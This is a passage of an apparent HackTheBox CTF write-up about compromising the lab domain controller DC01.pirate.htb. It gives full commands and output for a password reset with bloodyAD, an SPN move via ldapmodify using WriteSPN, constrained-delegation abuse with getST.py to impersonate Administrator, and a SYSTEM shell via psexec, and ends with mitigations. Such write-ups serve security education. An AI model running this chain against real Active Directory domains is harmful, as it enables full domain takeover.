+<p><code>WriteSPN</code> alone only allows registering a new SPN — it doesn't obviously lead to compromising the DC. The missing piece is how constrained delegation is actually validated: when the KDC decides whether to issue an S4U2Proxy ticket, it checks the <em>SPN string</em> the requesting account is trusted to delegate to (<code>msDS-AllowedToDelegateTo</code>), not which computer object currently owns that SPN. <code>a.white</code> already had delegation configured toward <code>HTTP/WEB01.pirate.htb</code>, most likely a legitimate setup letting it act on behalf of users against the web app on <code>WEB01</code>. That trust is bound to the SPN <em>string</em>, not to <code>WEB01</code> as a machine.</p>
+<p><code>WriteSPN</code> on <code>DC01</code> is what makes that exploitable: moving the identical SPN string onto <code>DC01</code> means the KDC still finds a match in <code>a.white</code>'s delegation list, but the resulting ticket is now bound to whichever object holds that name — <code>DC01</code>. Requesting the ticket with <code>-altservice</code> relabels it for <code>CIFS</code> in the same step, since a delegation ticket for one service on a host can be swapped for another service on that same host. This is an abuse of <code>WriteSPN</code> combined with an existing constrained delegation trust — not a Golden or Silver Ticket forgery.</p>
+<pre><code class="lang-bash">bloodyAD --host DC01.pirate.htb -d pirate.htb -u 'a.white' -p 'E2nvAOKSz5Xz2MJu' set password 'a.white_adm' 'Z1rovP@ss123!'
+</code></pre>
+<pre><code>[+] Password changed successfully!
+</code></pre>
+<pre><code class="lang-bash">nxc smb WEB01.pirate.htb -u a.white_adm -p 'Z1rovP@ss123!'
+</code></pre>
+<pre><code>SMB         192.168.100.2   445    WEB01            [*] Windows 10 / Server 2019 Build 17763 x64 (name:WEB01) (domain:pirate.htb) (signing:False) (SMBv1:False)
+SMB         192.168.100.2   445    WEB01            [+] pirate.htb\a.white_adm:Z1rovP@ss123!
+</code></pre>
+<h3>SPN relocation and constrained delegation abuse</h3>
+<p><code>getST.py -impersonate</code> needs an SPN that already exists in the domain to build the request against. <code>WEB01</code> carries <code>HTTP/WEB01.pirate.htb</code> — the exact string <code>a.white</code> is trusted to delegate to — so the plan is to move it onto <code>DC01</code>, request the ticket impersonating <code>Administrator</code>, and relabel it for <code>CIFS</code>.</p>
+<p>SPN strings must be unique domain-wide, so it's removed from <code>WEB01</code> first:</p>
+<pre><code class="lang-bash">ldapmodify -H ldap://10.129.116.1 -D 'pirate\a.white_adm' -w 'Z1rovP@ss123!' &lt;&lt; 'EOF'
+dn: CN=WEB01,CN=Computers,DC=pirate,DC=htb
+changetype: modify
+delete: servicePrincipalName
+servicePrincipalName: HTTP/WEB01.pirate.htb
+EOF
+</code></pre>
+<pre><code>modifying entry &quot;CN=WEB01,CN=Computers,DC=pirate,DC=htb&quot;
+</code></pre>
+<p>Then added to <code>DC01</code>, which is only possible because <code>a.white</code> holds <code>WriteSPN</code> there:</p>
+<pre><code class="lang-bash">ldapmodify -H ldap://10.129.116.1 -D 'pirate\a.white_adm' -w 'Z1rovP@ss123!' &lt;&lt; 'EOF'
+dn: CN=DC01,OU=Domain Controllers,DC=pirate,DC=htb
+changetype: modify
+add: servicePrincipalName
+servicePrincipalName: HTTP/WEB01.pirate.htb
+EOF
+</code></pre>
+<pre><code>modifying entry &quot;CN=DC01,OU=Domain Controllers,DC=pirate,DC=htb&quot;
+</code></pre>
+<p><code>DC01</code> now holds the SPN string <code>a.white</code>'s delegation trust points to:</p>
+<pre><code class="lang-bash">getST.py -spn 'HTTP/WEB01.pirate.htb' -impersonate Administrator -altservice 'CIFS/DC01.pirate.htb' -dc-ip 10.129.116.1 'pirate.htb/a.white_adm:Z1rovP@ss123!'
+</code></pre>
+<pre><code>Impacket v0.14.0.dev0+20260828.120813.032dfb1b - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Changing service from HTTP/WEB01.pirate.htb@PIRATE.HTB to CIFS/DC01.pirate.htb@PIRATE.HTB
+[*] Saving ticket in Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache
+</code></pre>
+<p><code>Changing service</code> confirms the delegation check passed first — the KDC issued the ticket based on the SPN string matching <code>a.white</code>'s trust — and only then was it relabeled for <code>CIFS</code> on <code>DC01</code>.</p>
+<pre><code class="lang-bash">export KRB5CCNAME=Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache
+klist
+</code></pre>
+<pre><code>Ticket cache: FILE:Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache
+Default principal: Administrator@pirate.htb
+
+Valid starting       Expires              Service principal
+09/06/2026 01:32:23  09/06/2026 11:32:22  CIFS/DC01.pirate.htb@PIRATE.HTB
+	renew until 09/07/2026 01:31:56
+</code></pre>
+<pre><code class="lang-bash">psexec.py -k -no-pass pirate.htb/Administrator@DC01.pirate.htb
+</code></pre>
+<pre><code>Impacket v0.14.0.dev0+20260828.120813.032dfb1b - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on DC01.pirate.htb.....
+[*] Found writable share ADMIN$
+[*] Uploading file JVZkkzxz.exe
+[*] Opening SVCManager on DC01.pirate.htb.....
+[*] Creating service CEHe on DC01.pirate.htb.....
+[*] Starting service CEHe.....
+
+C:\Windows\system32&gt; hostname
+DC01
+
+C:\Windows\system32&gt; whoami
+nt authority\system
+</code></pre>
+<h2>Post Exploitation</h2>
+<pre><code class="lang-powershell">powershell
+hostname ; whoami ; ipconfig ; type root.txt
+</code></pre>
+<pre><code>DC01
+nt authority\system
+
+Windows IP Configuration
+
+
+Ethernet adapter vEthernet (Switch01):
+
+   Connection-specific DNS Suffix  . : 
+   Link-local IPv6 Address . . . . . : fe80::d976:c606:587e:f1e1%8
+   IPv4 Address. . . . . . . . . . . : 192.168.100.1
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 
+
+Ethernet adapter Ethernet0 2:
+
+   Connection-specific DNS Suffix  . : .htb
+   IPv4 Address. . . . . . . . . . . : 10.129.116.1
+   Subnet Mask . . . . . . . . . . . : 255.255.0.0
+   Default Gateway . . . . . . . . . : 10.129.0.1
+b2fae5f4173ebcb98cc289993627****
+</code></pre>
+<p><code>DC01</code>'s two interfaces confirm it's the dual-homed bridge between the external <code>10.129.0.0/16</code> range and the internal <code>192.168.100.0/24</code> subnet where <code>WEB01</code> sat.</p>
+<h2>Mitigations</h2>
+<p><strong>Rotate or remove pre-created computer accounts promptly.</strong> <code>MS01$</code> and <code>EXCH01$</code> were staged but never joined, leaving their default lowercase-name passwords active. Audit for this class of account with tools like NetExec's <code>pre2k</code> module and either complete the join or disable the account.</p>
+<p><strong>Scope <code>ReadGMSAPassword</code> tightly.</strong> <code>Domain Secure Servers</code> let a workstation-level account read the passwords of two service accounts tied to certificate and federation infrastructure; limit gMSA read rights to the exact hosts that run the corresponding service.</p>
+<p><strong>Enforce SMB signing on every host, not only the DC.</strong> <code>WEB01</code> allowed unsigned SMB, enabling the coercion-to-LDAPS relay.</p>
+<p><strong>Patch and restrict coercion primitives.</strong> <code>WEB01</code> was vulnerable to PetitPotam, PrinterBug and MSEven at once. Apply the relevant updates and disable Print Spooler / EFS where not needed.</p>
+<p><strong>Treat uncontrolled <code>WriteSPN</code> over Domain Controllers as a critical privilege, and audit constrained delegation independently of SPN ownership.</strong> <code>a.white</code>'s pre-existing delegation trust toward <code>HTTP/WEB01.pirate.htb</code> only became a path to the DC because it also held <code>WriteSPN</code> there. Neither fact alone was the issue — the combination was. No account outside Domain Admins should be able to modify <code>servicePrincipalName</code> on a DC object, and delegation trusts should be reviewed on their own regardless of who can currently write SPNs.</p>
+<p><strong>Stop relying on Autologon for domain accounts.</strong> The <code>DefaultPassword</code> LSA secret on <code>WEB01</code> stored <code>a.white</code>'s password in cleartext; use DPAPI or a secrets manager instead.</p>
+<hr />
+<p><strong>Tools used:</strong> <a href="https://nmap.org/" target="_blank" rel="noopener noreferrer">Nmap</a> · <a href="https://github.com/Pennyw0rth/NetExec" target="_blank" rel="noopener noreferrer">NetExec</a> · <a href="https://github.com/SpecterOps/BloodHound" target="_blank" rel="noopener noreferrer">BloodHound-CE</a> · <a href="https://github.com/fortra/impacket" target="_blank" rel="noopener noreferrer">Impacket</a> (getTGT, getST, psexec, secretsdump, ntlmrelayx) · <a href="https://github.com/Hackplayers/evil-winrm" target="_blank" rel="noopener noreferrer">Evil-WinRM</a> · <a href="https://github.com/nicocha30/ligolo-ng" target="_blank" rel="noopener noreferrer">Ligolo-ng</a> · <a href="https://github.com/topotam/PetitPotam" target="_blank" rel="noopener noreferrer">PetitPotam</a> · <a href="https://github.com/CravateRouge/bloodyAD" target="_blank" rel="noopener noreferrer">bloodyAD</a></p>
+
+      </div>
+    </article>
+    <aside class="col-sidebar"></aside>
+  </main>
+<footer class="site-footer">
+  <div class="footer-main">
+    <div class="footer-col">
+      <div class="footer-col-label">z1rov</div>
+      <div class="footer-brand">
+        <svg style="width:22px;height:23px;flex-shrink:0;display:block;" viewBox="-0.5 -0.5 262 270" xmlns="http://www.w3.org/2000/svg">
+          <path fill="#c82525" d="M -0.5,-0.5 C 86.8333,-0.5 174.167,-0.5 261.5,-0.5C 261.5,89.5 261.5,179.5 261.5,269.5C 174.167,269.5 86.8333,269.5 -0.5,269.5C -0.5,179.5 -0.5,89.5 -0.5,-0.5 Z"/>
+          <path fill="#f9f8f8" d="M 121.5,149.5 C 120.244,149.461 119.244,149.961 118.5,151C 143.831,151.5 169.164,151.667 194.5,151.5C 194.5,159.167 194.5,166.833 194.5,174.5C 151.167,174.5 107.833,174.5 64.5,174.5C 64.169,166.472 64.5023,158.472 65.5,150.5C 90.1104,140.298 114.777,130.298 139.5,120.5C 140.289,120.217 140.956,119.717 141.5,119C 115.835,118.5 90.1688,118.333 64.5,118.5C 64.5,110.833 64.5,103.167 64.5,95.5C 108.167,95.5 151.833,95.5 195.5,95.5C 195.831,103.528 195.498,111.528 194.5,119.5C 170.143,129.506 145.809,139.506 121.5,149.5 Z"/>
+        </svg>
+        <span class="footer-brand-text">z1ro<em>v</em></span>
+      </div>
+      <p class="footer-tagline">CTF writeups · malware analysis · pentesting<br>offensive research · competitive programmer at heart.</p>
+      <a href="https://buymeacoffee.com/z1rov" target="_blank" rel="noopener noreferrer" class="footer-coffee">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M18 8h1a4 4 0 0 1 0 8h-1"/><path d="M2 8h16v9a4 4 0 0 1-4 4H6a4 4 0 0 1-4-4V8z"/><line x1="6" y1="1" x2="6" y2="4"/><line x1="10" y1="1" x2="10" y2="4"/><line x1="14" y1="1" x2="14" y2="4"/></svg>
+        <div class="footer-coffee-text">
+          <span class="footer-coffee-label">Support the work</span>
+          <span class="footer-coffee-sub">Buy me a coffee</span>
+        </div>
+        <svg class="footer-coffee-arr" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><polyline points="9 18 15 12 9 6"/></svg>
+      </a>
+    </div>
+    <div class="footer-col footer-col-connect">
+      <div class="footer-col-label">Connect</div>
+      <div class="footer-socials">
+        <a href="https://github.com/z1rov" target="_blank" rel="noopener" class="footer-soc">
+          <svg fill="currentColor" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M12 2C6.477 2 2 6.484 2 12.017c0 4.425 2.865 8.18 6.839 9.504.5.092.682-.217.682-.483 0-.237-.008-.868-.013-1.703-2.782.605-3.369-1.343-3.369-1.343-.454-1.158-1.11-1.466-1.11-1.466-.908-.62.069-.608.069-.608 1.003.07 1.531 1.032 1.531 1.032.892 1.53 2.341 1.088 2.91.832.092-.647.35-1.088.636-1.338-2.22-.253-4.555-1.113-4.555-4.951 0-1.093.39-1.988 1.029-2.688-.103-.253-.446-1.272.098-2.65 0 0 .84-.27 2.75 1.026A9.564 9.564 0 0112 6.844c.85.004 1.705.115 2.504.337 1.909-1.296 2.747-1.027 2.747-1.027.546 1.379.202 2.398.1 2.651.64.7 1.028 1.595 1.028 2.688 0 3.848-2.339 4.695-4.566 4.943.359.309.678.92.678 1.855 0 1.338-.012 2.419-.012 2.747 0 .268.18.58.688.482A10.019 10.019 0 0022 12.017C22 6.484 17.522 2 12 2z" clip-rule="evenodd"/></svg>
+          GitHub
+        </a>
+        <a href="https://www.linkedin.com/in/fabian-g-huamani" target="_blank" rel="noopener" class="footer-soc">
+          <svg fill="currentColor" viewBox="0 0 24 24"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452z"/></svg>
+          LinkedIn
+        </a>
+        <a href="https://profile.hackthebox.com/profile/019c52fc-d8cf-7339-9385-c0d96f6f7efb" target="_blank" rel="noopener" class="footer-soc">
+          <svg viewBox="0 0 24 24" fill="currentColor"><path d="M11.996 0a1.119 1.119 0 0 0-.057.003.9.9 0 0 0-.236.05.907.907 0 0 0-.165.079L1.936 5.675a.889.889 0 0 0-.445.77v11.111a.889.889 0 0 0 .47.784l9.598 5.541.054.029v.002a.857.857 0 0 0 .083.035l.012.004c.028.01.056.018.085.026.01.001.011.003.016.004a.93.93 0 0 0 .296.015.683.683 0 0 0 .086-.015c.01 0 .011-.002.016-.004a.94.94 0 0 0 .085-.026l.012-.004a.882.882 0 0 0 .083-.035v-.002a1.086 1.086 0 0 0 .054-.029l9.599-5.541a.889.889 0 0 0 .469-.784V6.48l-.001-.026v-.008a.889.889 0 0 0-.312-.676l-.029-.026c0-.002-.01-.005-.01-.007a.899.899 0 0 0-.107-.07L12.453.127A.887.887 0 0 0 11.99 0zm.01 2.253c.072 0 .144.019.209.056l6.537 3.774a.418.418 0 0 1 0 .726l-6.537 3.774a.418.418 0 0 1-.418 0L5.26 6.807a.418.418 0 0 1 0-.726l6.537-3.774a.42.42 0 0 1 .209-.056zm-8.08 6.458a.414.414 0 0 1 .215.057l6.526 3.766a.417.417 0 0 1 .208.361v7.533a.417.417 0 0 1-.626.361l-6.523-3.766a.417.417 0 0 1-.209-.362V9.13c0-.261.196-.414.41-.418zm16.16 0c.215.004.41.177.41.418v7.532a.42.42 0 0 1-.208.362l-6.526 3.766a.417.417 0 0 1-.626-.361v-7.533c0-.149.08-.286.209-.36l6.523-3.767a.415.415 0 0 1 .216-.057z"/></svg>
+          HackTheBox
+        </a>
+        <a href="https://leetcode.com/u/z1rov/" target="_blank" rel="noopener" class="footer-soc">
+          <svg viewBox="0 0 24 24" fill="currentColor"><path d="M13.483 0a1.374 1.374 0 0 0-.961.438L7.116 6.226l-3.854 4.126a5.266 5.266 0 0 0-1.209 2.104 5.35 5.35 0 0 0-.125.513 5.527 5.527 0 0 0 .062 2.362 5.83 5.83 0 0 0 .349 1.017 5.938 5.938 0 0 0 1.271 1.818l4.277 4.193.039.038c2.248 2.165 5.852 2.133 8.063-.074l2.396-2.392c.54-.54.54-1.414.003-1.955a1.378 1.378 0 0 0-1.951-.003l-2.396 2.392a3.021 3.021 0 0 1-4.205.038l-.02-.019-4.276-4.193c-.652-.64-.972-1.469-.948-2.263a2.68 2.68 0 0 1 .066-.523 2.545 2.545 0 0 1 .619-1.164L9.13 8.114c1.058-1.134 3.204-1.27 4.43-.278l3.501 2.831c.593.48 1.461.387 1.94-.207a1.384 1.384 0 0 0-.207-1.943l-3.5-2.831c-.8-.647-1.766-1.045-2.774-1.202l2.015-2.158A1.384 1.384 0 0 0 13.483 0zm-2.866 12.815a1.38 1.38 0 0 0-1.38 1.382 1.38 1.38 0 0 0 1.38 1.382H20.79a1.38 1.38 0 0 0 1.38-1.382 1.38 1.38 0 0 0-1.38-1.382z"/></svg>
+          LeetCode
+        </a>
+        <a href="https://codeforces.com/profile/z1rov" target="_blank" rel="noopener" class="footer-soc">
+          <svg viewBox="0 0 24 24" fill="currentColor"><path d="M4.5 7.5C5.328 7.5 6 8.172 6 9v10.5c0 .828-.672 1.5-1.5 1.5h-3C.672 21 0 20.328 0 19.5V9c0-.828.672-1.5 1.5-1.5h3zm9-4.5c.828 0 1.5.672 1.5 1.5v15c0 .828-.672 1.5-1.5 1.5h-3c-.828 0-1.5-.672-1.5-1.5v-15c0-.828.672-1.5 1.5-1.5h3zm9 7.5c.828 0 1.5.672 1.5 1.5v7.5c0 .828-.672 1.5-1.5 1.5h-3c-.828 0-1.5-.672-1.5-1.5V12c0-.828.672-1.5 1.5-1.5h3z"/></svg>
+          Codeforces
+        </a>
+        <a href="https://discord.gg/4nnsYWjbUk" target="_blank" rel="noopener" class="footer-soc">
+          <svg viewBox="0 0 24 24" fill="currentColor"><path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057c.002.022.015.043.031.051a19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03zM8.02 15.33c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.956-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.956 2.418-2.157 2.418zm7.975 0c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.955-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.946 2.418-2.157 2.418z"/></svg>
+          Discord
+        </a>
+      </div>
+    </div>
+  </div>
+  <div class="footer-bar">
+    <span class="footer-copy">© 2026 <em>z1rov</em> · All rights reserved.</span>
+    <div class="footer-bar-links">
+      <a href="#" class="footer-bar-link">Privacy</a>
+      <span class="footer-bar-sep">·</span>
+      <a href="#" class="footer-bar-link">RSS</a>
+      <span class="footer-bar-sep">·</span>
+      <a href="../page/about.html" class="footer-bar-link">About</a>
+    </div>
+  </div>
+</footer>
+  <script src="/js/app.js"></script>
+  <script src="/js/post.js"></script>
+  <script src="/js/search.js"></script>
+  <script src="/js/analytics.js"></script>
+  <script src="/js/collapse.js"></script>
+</body>
+</html>
